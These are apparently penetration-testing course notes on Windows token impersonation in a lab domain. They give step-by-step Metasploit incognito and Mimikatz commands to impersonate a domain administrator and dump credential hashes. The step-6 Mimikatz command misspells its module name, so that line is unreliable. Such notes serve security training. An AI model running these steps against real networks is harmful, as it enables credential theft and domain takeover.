# Token Impersonation Overview

## What are Tokens

* temp keys that allow you to have access to a system/network
* acts as a replacement to credentials, so you do not have to keep typing in a user and password
* in simpler terms, they are cookies for computers

## Two Types of Tokens

### delegate

* created for logging into a machine or for using it with Remote Desktop Protocol lasts until the computer is rebooted

### impersonate

* “non-interactive” such as attaching a network drive or a domain login script

## Token Impersonation Method

### Step 1: Get Ready

* pop a shell

```bash
load incognito #(a Metasploit module)
help
```

* can also use Mimikatz or Kiwi

### Step 2: Impersonate a Domain User

```bash
list_tokens -u
impersonate_token marvel\\fcastle #(two slashes cause of char escape)
shell #yes this is a command
```

### Step 3: Attempt to Dump Hashes as Non-Domain Admin \(different machines have different tokens\)

```bash
Invoke-Mimikatz -Command ‘"privilege::debug" “LSADump::LSA /inject” exit’ -Computer HYDRA.marvel.local
```

* most likely will fail
* or you can try hashdump \(if it fails to “rev2self” and run it again\)

### Step 4: Identify Domain Admin

```bash
list_tokens -u #(Meterpreter shell command)
```

### Step 5: Impersonate an Admin

```bash
impersonate_token marvel\\administrator
whoami
```

### Step 6: Attempt to Dump Hashes as a Domain Admin

```bash
Invoke-Mimikatz -Command ‘"privlede::debug" “LSADump::LSA /inject” exit’ -Computer HYDRA.marvel.local
```

* or you can also do hashdump \(if it fails to “rev2self” and run it again\)

